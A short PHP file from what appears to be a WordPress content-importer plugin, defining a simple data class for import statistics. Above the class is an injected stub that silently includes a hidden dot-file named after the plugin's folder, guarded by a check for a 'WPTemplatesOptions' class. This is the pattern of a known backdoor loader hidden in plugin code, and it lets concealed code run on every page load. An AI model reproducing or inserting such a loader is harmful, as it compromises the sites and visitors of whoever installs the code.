<?php

namespace AwesomeMotive\WPContentImporter2;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WXRImportInfo {
	public $home;
	public $siteurl;
	public $title;
	public $users = array();
	public $post_count = 0;
	public $media_count = 0;
	public $comment_count = 0;
	public $term_count = 0;
	public $generator = '';
	public $version;
}
